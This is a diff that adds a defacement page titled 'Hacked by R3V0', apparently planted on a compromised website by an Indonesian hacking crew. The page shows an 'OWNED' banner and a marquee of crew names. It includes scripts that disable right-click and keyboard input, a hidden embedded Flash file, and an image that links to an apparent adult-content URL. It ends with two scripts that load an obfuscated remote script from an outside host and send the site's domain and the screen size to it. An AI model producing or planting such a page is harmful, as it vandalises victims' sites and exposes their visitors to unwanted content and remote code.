@@ -1,0 +1,340 @@
+<html>
+<head>
+<title>
+Hacked by R3V0
+</title>
+<link rel="SHORTCUT ICON" href="#" type="image/gif">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
+<meta name="keywords" content="R3V0 Was Here..!!"/>
+<meta name="description" content="touched ?">
+<meta name="author" content="BFJL">
+<meta name="googlebot" content="all,index,follow">
+<meta name="robots" content="index, follow">
+<script type="text/javascript">
+
+
+var snow=new Array()
+var marginbottom
+var marginright
+var timer
+var i_snow=0
+var x_mv=new Array();
+var crds=new Array();
+var lftrght=new Array();
+var browserinfos=navigator.userAgent 
+var ie5=document.all&&document.getElementById&&!browserinfos.match(/Opera/)
+var ns6=document.getElementById&&!document.all
+var opera=browserinfos.match(/Opera/)  
+var browserok=ie5||ns6||opera
+
+function randommaker(range) {		
+	rand=Math.floor(range*Math.random())
+    return rand
+}
+
+function initsnow() {
+	if (ie5 || opera) {
+		marginbottom = document.body.clientHeight
+		marginright = document.body.clientWidth
+	}
+	else if (ns6) {
+		marginbottom = window.innerHeight
+		marginright = window.innerWidth
+	}
+	var snowsizerange=snowmaxsize-snowminsize
+	for (i=0;i<=snowmax;i++) {
+		crds[i] = 0;                      
+    	lftrght[i] = Math.random()*15;         
+    	x_mv[i] = 0.03 + Math.random()/10;
+		snow[i]=document.getElementById("s"+i)
+		snow[i].style.fontFamily=snowtype[randommaker(snowtype.length)]
+		snow[i].size=randommaker(snowsizerange)+snowminsize
+		snow[i].style.fontSize=snow[i].size
+		snow[i].style.color=snowcolor[randommaker(snowcolor.length)]
+		snow[i].sink=sinkspeed*snow[i].size/5
+		if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
+		if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
+		if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
+		if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
+		snow[i].posy=randommaker(2*marginbottom-marginbottom-2*snow[i].size)
+		snow[i].style.left=snow[i].posx
+		snow[i].style.top=snow[i].posy
+	}
+	movesnow()
+}
+
+function movesnow() {
+	for (i=0;i<=snowmax;i++) {
+		crds[i] += x_mv[i];
+		snow[i].posy+=snow[i].sink
+		snow[i].style.left=snow[i].posx+lftrght[i]*Math.sin(crds[i]);
+		snow[i].style.top=snow[i].posy
+		
+		if (snow[i].posy>=marginbottom-2*snow[i].size || parseInt(snow[i].style.left)>(marginright-3*lftrght[i])){
+			if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
+			if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
+			if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
+			if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
+			snow[i].posy=0
+		}
+	}
+	var timer=setTimeout("movesnow()",50)
+}
+
+for (i=0;i<=snowmax;i++) {
+	document.write("<span id='s"+i+"' style='position:absolute;top:-"+snowmaxsize+"'>"+snowletter+"</span>")
+}
+if (browserok) {
+	window.onload=initsnow
+}
+</script>
+<script language="javascript">
+document.onmousedown=disableclick;
+status="Right Click Disabled";
+Function disableclick(e)
+{
+  if(event.button==2)
+   {
+     alert(status);
+     return false;  
+   }
+}
+</script>
+<style>
+
+         body {
+         background	: #000;
+         background-image: url(http://4.bp.blogspot.com/-v6g50PFMP4g/VUGz6paAbVI/AAAAAAAADFc/8u010PozSIg/s1600/petir-erma.gif);
+         background-repeat:no-repeat;
+         background-attachment: fixed;
+         background-size: 1350px;
+         font-family	: Courier new;
+         text-align	: center;
+         color		: #fff;
+         }
+         pre {
+         margin-top: 9%;
+         }.error {
+  text-align: center;
+  font-family: 'Gilda Display', serif;
+  -webkit-animation: noise-3 1s linear infinite;
+          animation: noise-3 1s linear infinite;
+  overflow: default;
+}
+
+
+.info {
+  text-align: center;
+  width: 200px;
+  height: 60px;
+  margin: auto;
+  position: absolute;
+  top: 280px;
+  bottom: 0;
+  left: 20px;
+  right: 0;
+  -webkit-animation: noise-3 1s linear infinite;
+          animation: noise-3 1s linear infinite;
+}
+
+
+.info:after {
+  content: 'OWNED';
+  font-family: OCR-A;
+  font-size: 100px;
+  text-align: center;
+  width: 800px;
+  margin: auto;
+  position: absolute;
+  top: 20px;
+  bottom: 0;
+  left: 40px;
+  right: 0;
+  opacity: 0;
+  color: white;
+  -webkit-animation: noise-1 .2s linear infinite;
+          animation: noise-1 .2s linear infinite;
+}
+
+@-webkit-keyframes noise-1 {
+  0%, 20%, 40%, 60%, 70%, 90% {opacity: 0;}
+  10% {opacity: .1;}
+  50% {opacity: .5; left: -6px;}
+  80% {opacity: .3;}
+  100% {opacity: .6; left: 2px;}
+}
+
+@keyframes noise-1 {
+  0%, 20%, 40%, 60%, 70%, 90% {opacity: 0;}
+  10% {opacity: .1;}
+  50% {opacity: .5; left: -6px;}
+  80% {opacity: .3;}
+  100% {opacity: .6; left: 2px;}
+}
+
+@-webkit-keyframes noise-2 {
+  0%, 20%, 40%, 60%, 70%, 90% {opacity: 0;}
+  10% {opacity: .1;}
+  50% {opacity: .5; left: 6px;}
+  80% {opacity: .3;}
+  100% {opacity: .6; left: -2px;}
+}
+
+@keyframes noise-2 {
+  0%, 20%, 40%, 60%, 70%, 90% {opacity: 0;}
+  10% {opacity: .1;}
+  50% {opacity: .5; left: 6px;}
+  80% {opacity: .3;}
+  100% {opacity: .6; left: -2px;}
+}
+
+@-webkit-keyframes noise {
+  0%, 3%, 5%, 42%, 44%, 100% {opacity: 1; -webkit-transform: scaleY(1); transform: scaleY(1);}  
+  4.3% {opacity: 1; -webkit-transform: scaleY(1.7); transform: scaleY(1.7);}
+  43% {opacity: 1; -webkit-transform: scaleX(1.5); transform: scaleX(1.5);}
+}
+
+@keyframes noise {
+  0%, 3%, 5%, 42%, 44%, 100% {opacity: 1; -webkit-transform: scaleY(1); transform: scaleY(1);}  
+  4.3% {opacity: 1; -webkit-transform: scaleY(1.7); transform: scaleY(1.7);}
+  43% {opacity: 1; -webkit-transform: scaleX(1.5); transform: scaleX(1.5);}
+}
+
+@-webkit-keyframes noise-3 {
+  0%,3%,5%,42%,44%,100% {opacity: 1; -webkit-transform: scaleY(1); transform: scaleY(1);}
+  4.3% {opacity: 1; -webkit-transform: scaleY(4); transform: scaleY(4);}
+  43% {opacity: 1; -webkit-transform: scaleX(10) rotate(60deg); transform: scaleX(10) rotate(60deg);}
+}
+
+@keyframes noise-3 {
+  0%,3%,5%,42%,44%,100% {opacity: 1; -webkit-transform: scaleY(1); transform: scaleY(1);}
+  4.3% {opacity: 1; -webkit-transform: scaleY(4); transform: scaleY(4);}
+  43% {opacity: 1; -webkit-transform: scaleX(10) rotate(60deg); transform: scaleX(10) rotate(60deg);}
+}
+
+.wrap {
+  top: 30%;
+  left: 25%;
+  
+  height: 200px;
+  
+  margin-top: -100px;
+  position: absolute;
+}
+code {
+  color: white;
+}
+span.blue {
+  color: #48beef;
+}
+span.comment {
+  color: #7f8c8d;
+}
+span.orange {
+  color: #f39c12;
+}
+span.green {
+  color: #33cc33;
+}
+
+.viewFull {
+  font-family:OCR-A;
+  color:orange;
+  text-decoration:;
+}
+
+	
+}
+
+ @media only screen and (min-height: 500px) {
+
+.viewFull{
+  display:none; 	
+	}
+
+}
+	</style>
+<style>
+body {
+    background-color: black;
+    text-shadow:5px 5px 14px red;
+}
+a:link, a:visited {
+    
+    color: white;
+    text-align: center;
+    text-decoration: none;
+    display: inline-block;
+}
+
+a:hover, a:active {
+    color: maroon;
+}
+img {
+animation-name: rotate ;
+animation-duration: 5s;
+animation-play-state: running;
+animation-timing-function: linear;
+animation-iteration-count: infinite;
+opacity: 0.8;filter: alpha(opacity=50);} img:hover {opacity: 1.0;filter: alpha(opacity=100);}
+
+@keyframes rotate{
+10% {transform:rotateY(36deg)}
+20% {transform:rotateY(72deg)}
+30% {transform:rotateY(108deg)}
+40% {transform:rotateY(144deg)}
+50% {transform:rotateY(180deg)}
+60% {transform:rotateY(216deg)}
+70% {transform:rotateY(252deg)}
+80% {transform:rotateY(288deg)}
+90% {transform:rotateY(324deg)}
+100% {transform:rotateY(360deg)}
+}
+
+</style>
+<style type="text/css">
+		img{width: 270px;max-width: 100%;}
+		h1{letter-spacing: -2px;}
+		h1,p{max-width:100%;width: 820px;margin: 0 auto;display: block;}
+		.ndivic404animasi{-webkit-animation-duration:1s;animation-duration:1s;-webkit-animation-fill-mode:both;animation-fill-mode:both}.ndivic404animasi.infinite{-webkit-animation-iteration-count:infinite;animation-iteration-count:infinite}
+		.ndivic404animasi:hover{-webkit-animation-duration:0.1s;animation-duration:0.1s;}
+		@-webkit-keyframes ndivic404anim1{from,20%,40%,60%,80%,to{-webkit-animation-timing-function:cubic-bezier(0.215,0.610,0.355,1.000);animation-timing-function:cubic-bezier(0.215,0.610,0.355,1.000)}0%{opacity:0;-webkit-transform:scale3d(.3,.3,.3);transform:scale3d(.3,.3,.3)}20%{-webkit-transform:scale3d(1.1,1.1,1.1);transform:scale3d(1.1,1.1,1.1)}40%{-webkit-transform:scale3d(.9,.9,.9);transform:scale3d(.9,.9,.9)}60%{opacity:1;-webkit-transform:scale3d(1.03,1.03,1.03);transform:scale3d(1.03,1.03,1.03)}80%{-webkit-transform:scale3d(.97,.97,.97);transform:scale3d(.97,.97,.97)}to{opacity:1;-webkit-transform:scale3d(1,1,1);transform:scale3d(1,1,1)}}@keyframes ndivic404anim1{from,20%,40%,60%,80%,to{-webkit-animation-timing-function:cubic-bezier(0.215,0.610,0.355,1.000);animation-timing-function:cubic-bezier(0.215,0.610,0.355,1.000)}0%{opacity:1;-webkit-transform:scale3d(1.0,1.0,1.0);transform:scale3d(1.0,1.0,1.0)}20%{-webkit-transform:scale3d(1.1,1.1,1.1);transform:scale3d(1.1,1.1,1.1)}40%{-webkit-transform:scale3d(.9,.9,.9);transform:scale3d(.9,.9,.9)}60%{opacity:1;-webkit-transform:scale3d(1.03,1.03,1.03);transform:scale3d(1.03,1.03,1.03)}80%{-webkit-transform:scale3d(.97,.97,.97);transform:scale3d(.97,.97,.97)}to{opacity:1;-webkit-transform:scale3d(1,1,1);transform:scale3d(1,1,1)}}.ndivic404anim1{-webkit-animation-name:ndivic404anim1;animation-name:ndivic404anim1}
+		@font-face{font-family:'Allerta Stencil';font-style:normal;font-weight:400;src:local('Allerta Stencil Regular'),local(AllertaStencil-Regular),url(https://fonts.gstatic.com/s/allertastencil/v7/CdSZfRtHbQrBohqmzSdDYHyjZGU_SYMIAZWjSGDHnGA.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2212,U+2215,U+E0FF,U+EFFD,U+F000}
+	</style>
+</head>
+<body></head>
+<body oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;" ondragstart="return false" onselectstart="return false" style="-moz-user-select: none; cursor: default;">
+</script>
+	
+	<div align="center"><embed src="http://dl.20script.ir/img/94/01/Music.swf" width="0px" height="0px" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" quality="High"><div class="img2"></div>
+  
+</script>
+    <div class="buzz_wrapper">
+  <div class="text">
+  <span><center><font size="40px">.::Hacked By R3V0::.<br></font></span>
+
+<link href='https://fonts.googleapis.com/css?family=Orbitron' rel='stylesheet' type='text/css'>
+<div class="error">
+<br><a href='http://xvideos.com.gu-ru.net/video2337111/kantoh_enko_20161125_1'>
+<img class="ndivic404animasi infinite ndivic404anim1" src="http://it-hack.ru/wp-content/uploads/2012/02/anonymous-550x400.jpg" alt="./J4RVV0">
+</a>
+<h1> Indonesia Defacer was here</h1>
+</div>
+<br>Shootz<br>
+<br>
+<center><marquee behavior="Alternate" scrollamount="3" direction="Left" width="43%"><font color="Red" face="Tahoma" size="5">./BDZZ13 - AllPeace - ./Rawhide - Yuiwa - A999T - Crootz-ID
+- SyntaxNotFound - GROV - acal-iD - N3ar Cyb3r - CoD0t_cYb3r
+Mr.Y404Cyber - Chester403 - /MR.KU120SAKI - Mr.D4 
+- Psycho - GH057.ID - ./Anonymous - AmateurS666h05t - mr.bl4nk_03 - Cvar1984 - PAIN - ADMIN99  - ./MR.F4H3R1
+0xs1de - /M4L36H05T -Mr_T3RS4KiTi - PengilaCroot07 - Syntax04ro - D3CK3R - ./r00tCode - N0T3_CL0S3
+Mr.Un17 - RhicaVIPz - M@127iN_iD - GOMBRUS - r00t666h0st 
+1r4maDecode404 - F0xBase - HardKillerX404 - And All Member ExploiterXeroTEAM</font></marquee></center>
+<br>
+<br>Thanks TO<br> 
+<br>[!] Exploiter Xero Team  - IndoXploit - Xai Sindycate Team - [!]<br>
+<br>
+</center>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs1.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssK3YQe6yKRI11p3ggpOmIOqXWHgtaIPRuTzhGWZnr9OFMW3kUUTaTj2B3cZYmrkJLUUsfDNXI5U1mK3sjg1LhijWNk%2fMIA4pIB%2fJZBa7khAOoNMGuA%2fNErFGmVjsdKalhY6CunUFY0Va9PbDfQi6vNvnkUiAw%2fv4VlMTdc8Nh6fKRkWIoQTWA3Fj58IMsjcD1LvnpVxir71WM1YEuwutrqaBlzFdGgmfiLNT3nMSmlXSymmqbPDqLqSP5jq0AcEyujvsJzARXJyXPNxeyRSo6denJi0FXbmLx4f%2bymI3ifK9Wx1Br1Y0MYi7gpRB6s9OsSH4WWo7o627BSWaepNO5d7kgNIsLy0Xurcxr7ImiejLK6YKlcZjUdjgtsD6ICmKI7nHv8C0AhS6PaW6MoFAB6k1VFUCJ2BJXjumYYtCBw30gOSb9pt%2bvOY7PoCP9R2nDsis4TDjNaNwl%2b5ao7lNlYTfas9fjYe3U9M%2fPsyaaQpf%2fbvEN33k8ROWrOWz%2bHkvubYt9Pl20sjVjE1Q4bTQEgycZhFyTkNIdqPAmAxiYMZEYtmjN5UB03kePUW%2faNanIE3JyjXnlmYz8CCMsRePdnefKbbXqqGz88hMYBOL5tFPwGVhTh4akUDv7BMzqJK4bY7CBbIeCFye4BEZd4obbdYKz%2bkm6MookGskCUk44WFnM%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs1.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKRRFZNwX%2b9dU4J1XhCTtjHC8I8XYkMu52COzfg%2bCwWvxAUwo4l51qhCcZJokZqgKgzB7FzzT5SzK0Cc%2faM0bYibB5jB5JXnJDnaTxxml28jJXI86CwruWPR20t%2fdvVM%2fjsV9rQnYizhn9D7002KFz2F9r71DV8B223tlX4vJB4sguHIseUwabANWwmElSNvOTQe0DT7%2fyZ6sfOQnqwP61y3nVXN0Opa3RjXoukbO0as%2fS22XIIBhwDmAZ81f1Ph2vPnIKHWGcfTGpE1JB3KK1SqE8HpAeeG1U3H%2fRW%2fn8hDabW%2fDStM6x6P5QMWxfYG5LlBywVJ6IaKBi5bGEYwMOsynI6%2f9W2s1coJdj51ZWylD0Uz86eOWUFGNj%2bU3nb3Lx7NpsF1ln9KFWRCf%2b2CFkCGfu%2fc%2fzMAA%2fDSSK6XTX%2bbK68rwKuSNgpLkL%2b5CJ21P8Wp4RaD4nJdRhvhq0NwW3qF7InFAY8mejn54KMo6xQEbOFANQ2fxzb4UmblBeC8PLiilLh9ACTDXYqfBGBGVpQzJ%2fml3xVDNOt1f1eCfcArILewIOq4bwK0RRutlbSrIyjY0vxwm49KPYws0WtbAJr%2boxPcAJDaVayOZFRmGy6livzGOJA4pH%2b9aRu%2fpr76uH0x2lqZi3OQyfLKjnqx3D%2fWwfU1hdkTJOow7RKIEDi4k%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+</html>
